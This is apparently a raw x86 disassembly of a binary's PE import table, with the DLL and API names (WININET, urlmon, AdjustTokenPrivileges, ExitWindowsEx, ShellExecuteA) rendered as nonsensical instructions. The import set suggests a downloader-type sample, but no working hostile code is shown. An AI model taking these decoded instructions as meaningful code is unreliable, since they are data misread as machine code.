2aa018f2:	add    BYTE PTR [eax],al
2aa018f4:	ins    BYTE PTR es:[edi],dx
2aa018f5:	adc    BYTE PTR [eax],al
	...
2aa0190b:	add    BYTE PTR [ecx+ebx*1+0x19ac0000],dl
2aa01912:	add    BYTE PTR [eax],al
2aa01914:	les    ebx,FWORD PTR [ecx]
2aa01916:	add    BYTE PTR [eax],al
2aa01918:	add    BYTE PTR [eax],al
2aa0191a:	add    BYTE PTR [eax],al
2aa0191c:	out    0x19,al
2aa0191e:	add    BYTE PTR [eax],al
2aa01920:	add    BYTE PTR [eax],al
2aa01922:	add    BYTE PTR [eax],al
2aa01924:	push   cs
2aa01925:	sbb    eax,DWORD PTR [eax]
2aa01927:	add    BYTE PTR [eax],ah
2aa01929:	sbb    eax,DWORD PTR [eax]
2aa0192b:	add    BYTE PTR [edx],dh
2aa0192d:	sbb    eax,DWORD PTR [eax]
2aa0192f:	add    BYTE PTR [ebx+ebx*1+0x0],al
2aa01933:	add    BYTE PTR [eax-0x47ffffe6],ch
2aa01939:	sbb    al,BYTE PTR [eax]
2aa0193b:	add    BYTE PTR [eax],al
2aa0193d:	sbb    eax,DWORD PTR [eax]
2aa0193f:	add    dl,ch
2aa01941:	sbb    al,BYTE PTR [eax]
2aa01943:	add    dh,bl
2aa01945:	sbb    al,BYTE PTR [eax]
2aa01947:	add    dh,dl
2aa01949:	sbb    al,BYTE PTR [eax]
2aa0194b:	add    BYTE PTR [esi],bl
2aa0194d:	sbb    al,BYTE PTR [eax]
2aa0194f:	add    BYTE PTR [edx+ebx*1],ch
2aa01952:	add    BYTE PTR [eax],al
2aa01954:	inc    eax
2aa01955:	sbb    al,BYTE PTR [eax]
2aa01957:	add    BYTE PTR [edx+ebx*1+0x0],dl
2aa0195b:	add    BYTE PTR [edx+0x1a],ah
2aa0195e:	add    BYTE PTR [eax],al
2aa01960:	outs   dx,BYTE PTR ds:[esi]
2aa01961:	sbb    al,BYTE PTR [eax]
2aa01963:	add    BYTE PTR [eax-0x73ffffe6],al
2aa01969:	sbb    al,BYTE PTR [eax]
2aa0196b:	add    BYTE PTR [edx-0x37ffffe6],bl
2aa01971:	sbb    al,BYTE PTR [eax]
2aa01973:	add    BYTE PTR [eax],al
2aa01975:	add    BYTE PTR [eax],al
2aa01977:	add    BYTE PTR [ebx+ebx*1+0x0],bh
2aa0197b:	add    BYTE PTR [eax],al
2aa0197d:	add    BYTE PTR [eax],al
2aa0197f:	add    BYTE PTR [eax+0x1b],ah
2aa01982:	add    BYTE PTR [eax],al
2aa01984:	add    BYTE PTR [eax],al
2aa01986:	add    BYTE PTR [eax],al
2aa01988:	push   edi
2aa01989:	dec    ecx
2aa0198a:	dec    esi
2aa0198b:	dec    ecx
2aa0198c:	dec    esi
2aa0198d:	inc    ebp
2aa0198e:	push   esp
2aa0198f:	cs fs ins BYTE PTR es:[edi],dx
2aa01992:	ins    BYTE PTR es:[edi],dx
2aa01993:	add    BYTE PTR [eax+eax*1],bl
2aa01996:	inc    ecx
2aa01997:	fs push 0x75
2aa0199a:	jae    0x2aa01a10
2aa0199c:	push   esp
2aa0199d:	outs   dx,DWORD PTR ds:[esi]
2aa0199e:	imul   esp,DWORD PTR [ebp+0x6e],0x50
2aa019a2:	jb     0x2aa01a0d
2aa019a4:	jbe    0x2aa01a0f
2aa019a6:	ins    BYTE PTR es:[edi],dx
2aa019a7:	gs addr16 gs jae 0x2aa019ac
2aa019ac:	dec    ebp
2aa019ad:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
2aa019b1:	imul   esi,DWORD PTR [ebp+0x70],0x50
2aa019b5:	jb     0x2aa01a20
2aa019b7:	jbe    0x2aa01a22
2aa019b9:	ins    BYTE PTR es:[edi],dx
2aa019ba:	gs addr16 gs push esi
2aa019be:	popa   
2aa019bf:	ins    BYTE PTR es:[edi],dx
2aa019c0:	jne    0x2aa01a27
2aa019c2:	inc    ecx
2aa019c3:	add    BYTE PTR [edx+0x65704f01],ch
2aa019c9:	outs   dx,BYTE PTR ds:[esi]
2aa019ca:	push   eax
2aa019cb:	jb     0x2aa01a3c
2aa019cd:	arpl   WORD PTR [ebp+0x73],sp
2aa019d0:	jae    0x2aa01a26
2aa019d2:	outs   dx,DWORD PTR ds:[esi]
2aa019d3:	imul   esp,DWORD PTR [ebp+0x6e],0x0
2aa019d7:	add    BYTE PTR [ecx+0x44],al
2aa019da:	push   esi
2aa019db:	inc    ecx
2aa019dc:	push   eax
2aa019dd:	dec    ecx
2aa019de:	xor    esi,DWORD PTR [edx]
2aa019e0:	cs fs ins BYTE PTR es:[edi],dx
2aa019e3:	ins    BYTE PTR es:[edi],dx
2aa019e4:	add    BYTE PTR [eax],al
2aa019e6:	leave  
2aa019e7:	add    DWORD PTR [ebx+0x70],esi
2aa019ea:	jb     0x2aa01a55
2aa019ec:	outs   dx,BYTE PTR ds:[esi]
2aa019ed:	je     0x2aa01a55
2aa019ef:	add    BYTE PTR [ebx+0x52],al
2aa019f2:	push   esp
2aa019f3:	inc    esp
2aa019f4:	dec    esp
2aa019f5:	dec    esp
2aa019f6:	cs fs ins BYTE PTR es:[edi],dx
2aa019f9:	ins    BYTE PTR es:[edi],dx
2aa019fa:	add    BYTE PTR [eax],al
2aa019fc:	inc    ebx
2aa019fd:	push   edx
2aa019fe:	pop    ecx
2aa019ff:	push   eax
2aa01a00:	push   esp
2aa01a01:	xor    esi,DWORD PTR [edx]
2aa01a03:	cs fs ins BYTE PTR es:[edi],dx
2aa01a06:	ins    BYTE PTR es:[edi],dx
2aa01a07:	add    BYTE PTR [ebp+0x72],dh
2aa01a0a:	ins    BYTE PTR es:[edi],dx
2aa01a0b:	ins    DWORD PTR es:[edi],dx
2aa01a0c:	outs   dx,DWORD PTR ds:[esi]
2aa01a0d:	outs   dx,BYTE PTR ds:[esi]
2aa01a0e:	cs fs ins BYTE PTR es:[edi],dx
2aa01a11:	ins    BYTE PTR es:[edi],dx
2aa01a12:	add    BYTE PTR [eax],al
2aa01a14:	push   edi
2aa01a15:	dec    ecx
2aa01a16:	dec    esi
2aa01a17:	dec    ebp
2aa01a18:	dec    ebp
2aa01a19:	cs fs ins BYTE PTR es:[edi],dx
2aa01a1c:	ins    BYTE PTR es:[edi],dx
2aa01a1d:	add    BYTE PTR [esi],ch
2aa01a1f:	add    BYTE PTR [ebx+0x6c],al
2aa01a22:	outs   dx,DWORD PTR ds:[esi]
2aa01a23:	jae    0x2aa01a8a
2aa01a25:	dec    eax
2aa01a26:	popa   
2aa01a27:	outs   dx,BYTE PTR ds:[esi]
2aa01a28:	fs ins BYTE PTR es:[edi],dx
2aa01a2a:	add    BYTE PTR gs:[edi+0x1],dh
2aa01a2e:	inc    edi
2aa01a2f:	gs je  0x2aa01a7f
2aa01a32:	outs   dx,DWORD PTR ds:[esi]
2aa01a33:	fs jne 0x2aa01aa2
2aa01a36:	gs dec eax
2aa01a38:	popa   
2aa01a39:	outs   dx,BYTE PTR ds:[esi]
2aa01a3a:	fs ins BYTE PTR es:[edi],dx
2aa01a3c:	gs inc ecx
2aa01a3e:	add    BYTE PTR [eax],al
2aa01a40:	cmp    al,BYTE PTR [ecx]
2aa01a42:	inc    edi
2aa01a43:	gs je  0x2aa01a89
2aa01a46:	jne    0x2aa01aba
2aa01a48:	jb     0x2aa01aaf
2aa01a4a:	outs   dx,BYTE PTR ds:[esi]
2aa01a4b:	je     0x2aa01a9d
2aa01a4d:	jb     0x2aa01abe
2aa01a4f:	arpl   WORD PTR [ebp+0x73],sp
2aa01a52:	jae    0x2aa01a54
2aa01a54:	dec    ebp
2aa01a55:	add    BYTE PTR [ebx+0x72],al
2aa01a58:	gs popa 
2aa01a5a:	je     0x2aa01ac1
2aa01a5c:	inc    esi
2aa01a5d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x5202a900
2aa01a65:	gs popa 
2aa01a67:	fs inc esi
2aa01a69:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53030e00
2aa01a71:	gs je  0x2aa01aba
2aa01a74:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
2aa01a7c:	gs jb  0x2aa01a7f
2aa01a7f:	add    BYTE PTR [ebx+eax*1+0x74697257],dl
2aa01a86:	gs inc esi
2aa01a88:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6547015b
2aa01a90:	je     0x2aa01ad8
2aa01a92:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
2aa01a9a:	out    dx,al
2aa01a9b:	add    DWORD PTR [edi+0x6c],eax
2aa01a9e:	outs   dx,DWORD PTR ds:[esi]
2aa01a9f:	bound  esp,QWORD PTR [ecx+0x6c]
2aa01aa2:	inc    ecx
2aa01aa3:	ins    BYTE PTR es:[edi],dx
2aa01aa4:	ins    BYTE PTR es:[edi],dx
2aa01aa5:	outs   dx,DWORD PTR ds:[esi]
2aa01aa6:	arpl   WORD PTR [eax],ax
2aa01aa8:	retf   
2aa01aa9:	add    DWORD PTR [edi+0x65],eax
2aa01aac:	je     0x2aa01b02
2aa01aae:	gs ins DWORD PTR es:[edi],dx
2aa01ab0:	jo     0x2aa01b02
2aa01ab2:	popa   
2aa01ab3:	je     0x2aa01b1d
2aa01ab5:	inc    ecx
2aa01ab6:	add    BYTE PTR [eax],al
2aa01ab8:	aad    0x1
2aa01aba:	inc    edi
2aa01abb:	gs je  0x2aa01b12
2aa01abe:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
2aa01ac5:	je     0x2aa01ac7
2aa01ac7:	add    BYTE PTR [eax+eax*1+0x44],bh
2aa01acb:	gs ins BYTE PTR es:[edi],dx
2aa01acd:	gs je  0x2aa01b35
2aa01ad0:	inc    esi
2aa01ad1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x53034700
2aa01ad9:	ins    BYTE PTR es:[edi],dx
2aa01ada:	gs gs jo 0x2aa01ade
2aa01ade:	cmp    eax,0x706f4300
2aa01ae3:	jns    0x2aa01b2b
2aa01ae5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47017500
2aa01aed:	gs je  0x2aa01b3d
2aa01af0:	outs   dx,DWORD PTR ds:[esi]
2aa01af1:	fs jne 0x2aa01b60
2aa01af4:	gs inc esi
2aa01af6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
2aa01afe:	add    BYTE PTR [eax],al
2aa01b00:	scas   eax,DWORD PTR es:[edi]
2aa01b01:	add    BYTE PTR [ebp+0x78],al
2aa01b04:	imul   esi,DWORD PTR [eax+edx*2+0x72],0x7365636f
2aa01b0c:	jae    0x2aa01b0e
2aa01b0e:	pusha  
2aa01b0f:	add    BYTE PTR [ebx+0x72],al
2aa01b12:	gs popa 
2aa01b14:	je     0x2aa01b7b
2aa01b16:	push   eax
2aa01b17:	jb     0x2aa01b88
2aa01b19:	arpl   WORD PTR [ebp+0x73],sp
2aa01b1c:	jae    0x2aa01b5f
2aa01b1e:	add    BYTE PTR [eax],al
2aa01b20:	in     al,dx
2aa01b21:	add    DWORD PTR [edi+0x6c],eax
2aa01b24:	outs   dx,DWORD PTR ds:[esi]
2aa01b25:	bound  esp,QWORD PTR [ecx+0x6c]
2aa01b28:	inc    ecx
2aa01b29:	fs fs inc ecx
2aa01b2c:	je     0x2aa01b9d
2aa01b2e:	ins    DWORD PTR es:[edi],dx
2aa01b2f:	inc    ecx
2aa01b30:	add    BYTE PTR [eax],al
2aa01b32:	icebp  
2aa01b33:	add    DWORD PTR [edi+0x6c],eax
2aa01b36:	outs   dx,DWORD PTR ds:[esi]
2aa01b37:	bound  esp,QWORD PTR [ecx+0x6c]
2aa01b3a:	inc    esi
2aa01b3b:	imul   ebp,DWORD PTR [esi+0x64],0x6d6f7441
2aa01b42:	inc    ecx
2aa01b43:	add    dh,bl
2aa01b45:	add    DWORD PTR [edi+0x65],eax
2aa01b48:	je     0x2aa01ba0
2aa01b4a:	gs jb  0x2aa01bc0
2aa01b4d:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
2aa01b54:	push   edx
2aa01b55:	dec    esi
2aa01b56:	inc    ebp
2aa01b57:	dec    esp
2aa01b58:	xor    esi,DWORD PTR [edx]
2aa01b5a:	cs fs ins BYTE PTR es:[edi],dx
2aa01b5d:	ins    BYTE PTR es:[edi],dx
2aa01b5e:	add    BYTE PTR [eax],al
2aa01b60:	loope  0x2aa01b62
2aa01b62:	inc    ebp
2aa01b63:	js     0x2aa01bce
2aa01b65:	je     0x2aa01bbe
2aa01b67:	imul   ebp,DWORD PTR [esi+0x64],0x4573776f
2aa01b6e:	js     0x2aa01b70
2aa01b70:	push   ebp
2aa01b71:	push   ebx
2aa01b72:	inc    ebp
2aa01b73:	push   edx
2aa01b74:	xor    esi,DWORD PTR [edx]
2aa01b76:	cs fs ins BYTE PTR es:[edi],dx
2aa01b79:	ins    BYTE PTR es:[edi],dx
2aa01b7a:	add    BYTE PTR [eax],al
2aa01b7c:	push   es
2aa01b7d:	add    DWORD PTR [ebx+0x68],edx
2aa01b80:	gs ins BYTE PTR es:[edi],dx
2aa01b82:	ins    BYTE PTR es:[edi],dx
2aa01b83:	inc    ebp
2aa01b84:	js     0x2aa01beb
2aa01b86:	arpl   WORD PTR [ebp+0x74],si
2aa01b89:	gs inc ecx
2aa01b8b:	add    BYTE PTR [ebx+0x48],dl
2aa01b8e:	inc    ebp
2aa01b8f:	dec    esp
2aa01b90:	dec    esp
2aa01b91:	xor    esi,DWORD PTR [edx]
2aa01b93:	cs fs ins BYTE PTR es:[edi],dx
2aa01b96:	ins    BYTE PTR es:[edi],dx
	...
